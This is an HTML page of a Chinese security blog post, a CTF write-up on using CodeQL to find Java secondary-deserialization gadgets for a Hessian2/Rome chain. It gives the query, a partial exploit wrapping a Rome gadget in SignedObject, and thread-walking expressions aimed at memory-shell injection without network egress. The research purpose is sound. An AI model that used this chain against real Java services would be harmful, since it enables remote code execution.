@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="繁华的东方明珠，让我更加想念成都想念学校和家。（希望疫情好起来   简单的说一下为什么要开始写博客，之前不写我原因有2个，第一个是特别懒不想去搭建，第二个是因为更加自己写的东西都是重复别人大师傅的自己不配写一些精华的文章，这些都是我不想写的原因。但是自己还是想记录自己的适合和学习到的知识，所以就斗胆写下第一篇，希望保证每一篇都是《精华的?》 这里也感谢我大哥帮我搭建博客。atao  0x00 前言">
+<meta property="og:type" content="article">
+<meta property="og:title" content="codeql挖掘java二次反序列化">
+<meta property="og:url" content="http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="一往无前虎山行">
+<meta property="og:description" content="繁华的东方明珠，让我更加想念成都想念学校和家。（希望疫情好起来   简单的说一下为什么要开始写博客，之前不写我原因有2个，第一个是特别懒不想去搭建，第二个是因为更加自己写的东西都是重复别人大师傅的自己不配写一些精华的文章，这些都是我不想写的原因。但是自己还是想记录自己的适合和学习到的知识，所以就斗胆写下第一篇，希望保证每一篇都是《精华的?》 这里也感谢我大哥帮我搭建博客。atao  0x00 前言">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/firesss/imgs/raw/master/imgs/1943E969ADEA7E7772593CB43CB7D41C.jpg">
+<meta property="og:image" content="https://gitee.com/firesss/imgs/raw/master/imgs/image-20220322151346196.png">
+<meta property="article:published_time" content="2022-03-22T05:27:55.655Z">
+<meta property="article:modified_time" content="2022-03-22T07:17:10.161Z">
+<meta property="article:author" content="Firebasky">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/firesss/imgs/raw/master/imgs/1943E969ADEA7E7772593CB43CB7D41C.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>codeql挖掘java二次反序列化</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=codeql挖掘java二次反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=codeql挖掘java二次反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=codeql挖掘java二次反序列化&body=Check out this article: http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=codeql挖掘java二次反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=codeql挖掘java二次反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%80%9D%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">0x01 思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%93%8D%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">0x02 操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%89%A9%E5%B1%95"><span class="toc-number">4.</span> <span class="toc-text">0x03 扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="toc-number">5.</span> <span class="toc-text">0x04 不出网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        codeql挖掘java二次反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Firebasky</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-22T05:27:55.655Z" itemprop="datePublished">2022-03-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>繁华的东方明珠，让我更加想念成都想念学校和家。（希望疫情好起来</p>
+<p><img src="https://gitee.com/firesss/imgs/raw/master/imgs/1943E969ADEA7E7772593CB43CB7D41C.jpg" alt="img"></p>
+<blockquote>
+<p>简单的说一下为什么要开始写博客，之前不写我原因有2个，第一个是特别懒不想去搭建，第二个是因为更加自己写的东西都是重复别人大师傅的自己不配写一些精华的文章，这些都是我不想写的原因。但是自己还是想记录自己的适合和学习到的知识，所以就斗胆写下第一篇，希望保证每一篇都是《精华的?》</p>
+<p>这里也感谢我大哥帮我搭建博客。<a target="_blank" rel="noopener" href="https://erroratao.github.io/">atao</a></p>
+</blockquote>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前几天去打了2022hf比赛其中的java出的很好，更加像是真实环境中遇到的。比赛中没有想到了codeql去实现（工作忙，简单的所以了ast去分析了一下效果不太好。</p>
+<p>这里也简单的介绍一下这个题的思路：大概是一个不出网的环境，Hessian2反序列化，rome链。本来想直接替换getter为TemplatesImpl，结果因为反序列化不了_tfactory失败。就开始了找gadgets之路。</p>
+<h2 id="0x01-思考"><a href="#0x01-思考" class="headerlink" title="0x01 思考"></a>0x01 思考</h2><p>针对这个题最好的办法是直接接着找getter方法看看有没有可以执行命令的，或者找有没有触发getter之后继续使用原生反序列化去继续利用起rome的原生反序列化。</p>
+<h2 id="0x02-操作"><a href="#0x02-操作" class="headerlink" title="0x02 操作"></a>0x02 操作</h2><p>所以我们来编写一下简单的codeql语句</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@name</span> jdk gadgets</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line"><span class="comment">/*找到可以序列化类，实现了Serializable接口 */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Serializable</span> <span class="keyword">extends</span> <span class="title class_">Class</span>&#123;</span><br><span class="line">  Serializable()&#123;</span><br><span class="line">    <span class="built_in">this</span>.getASupertype() <span class="keyword">instanceof</span>  TypeSerializable</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 危险方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializableMethod</span> <span class="keyword">extends</span> <span class="title class_">Method</span> &#123;</span><br><span class="line">  SerializableMethod() &#123;</span><br><span class="line">    <span class="built_in">this</span>.getDeclaringType() <span class="keyword">instanceof</span> Serializable <span class="comment">//</span></span><br><span class="line">    and</span><br><span class="line">    <span class="built_in">this</span>.getName() = <span class="string">&quot;readObject&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GetMethod</span> <span class="keyword">extends</span> <span class="title class_">Method</span>&#123;</span><br><span class="line">  GetMethod()&#123;</span><br><span class="line">      <span class="built_in">this</span>.getDeclaringType() <span class="keyword">instanceof</span> Serializable and</span><br><span class="line">      <span class="built_in">this</span>.getName().indexOf(<span class="string">&quot;get&quot;</span>) = <span class="number">0</span> and</span><br><span class="line">      <span class="built_in">this</span>.getName().length() &gt; <span class="number">3</span> and</span><br><span class="line">      <span class="built_in">this</span>.isPublic() and</span><br><span class="line">      <span class="built_in">this</span>.fromSource() and</span><br><span class="line">      <span class="built_in">this</span>.hasNoParameters()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得方法的内部调用.getBody().getAChild*() </span></span><br><span class="line">from GetMethod getMethod, MethodAccess ma, Method method</span><br><span class="line">where  ma.getEnclosingStmt() = getMethod.getBody().getAChild*() <span class="type">and</span> <span class="variable">method</span> <span class="operator">=</span> ma.getMethod() and method.hasName(<span class="string">&quot;readObject&quot;</span>)</span><br><span class="line">select method,getMethod</span><br></pre></td></tr></table></figure>
+
+<p>大概的意思是寻找getter方法中有调用readObject的方法。并且我这里定义了getter方法的类必须实现Serializable，其实对于Hessian2是不需要的。跑一下</p>
+<p><img src="https://gitee.com/firesss/imgs/raw/master/imgs/image-20220322151346196.png" alt="image-20220322151346196"></p>
+<p>现在就来编写exp，其实就非常简单了，因为代码太大了，放出了核心代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//触发getObject 二次反序列化</span></span><br><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">keyGen</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>, <span class="string">&quot;SUN&quot;</span>);</span><br><span class="line"><span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> SecureRandom.getInstance(<span class="string">&quot;SHA1PRNG&quot;</span>, <span class="string">&quot;SUN&quot;</span>);</span><br><span class="line">keyGen.initialize(<span class="number">1024</span>, random);</span><br><span class="line"><span class="type">PrivateKey</span> <span class="variable">signingKey</span> <span class="operator">=</span> keyGen.generateKeyPair().getPrivate();</span><br><span class="line"><span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">signingEngine.initSign(signingKey);</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>((Serializable) Rome.getObject(),signingKey,signingEngine);</span><br><span class="line"></span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">item</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, item);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-扩展"><a href="#0x03-扩展" class="headerlink" title="0x03 扩展"></a>0x03 扩展</h2><p>其实后面的思路是别人告诉我的，getter方法也可以触发exec直接执行命令，大概是只能在linux下使用。</p>
+<p>现在来想一想自己编写的codeql太简单了，没有使用污点分析。（可能存在好多误报，继续学习………</p>
+<h2 id="0x04-不出网"><a href="#0x04-不出网" class="headerlink" title="0x04 不出网"></a>0x04 不出网</h2><p>之后是不出网，最开始是想到了使用写文件描述符fd实现回显示失败了，之后就想到了之前的内存木马都是通过当前线程获得的，那我们也可以找一下当前线程可能有利用的进行注入。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Thread.currentThread().group.threads[<span class="number">1</span>].target.<span class="built_in">this</span>$<span class="number">0.</span>contexts.list.first.item.handler).getClass()</span><br><span class="line">(Thread.currentThread().group.threads[<span class="number">1</span>].target.<span class="built_in">this</span>$<span class="number">0.</span>rspConnections).getClass()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>合理的使用codeql应该可以会出现很多利用点继续学习了。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%80%9D%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">0x01 思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%93%8D%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">0x02 操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%89%A9%E5%B1%95"><span class="toc-number">4.</span> <span class="toc-text">0x03 扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="toc-number">5.</span> <span class="toc-text">0x04 不出网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=codeql挖掘java二次反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=codeql挖掘java二次反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=codeql挖掘java二次反序列化&body=Check out this article: http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=codeql挖掘java二次反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=codeql挖掘java二次反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/22/codeql%E6%8C%96%E6%8E%98java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=codeql挖掘java二次反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    Firebasky
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
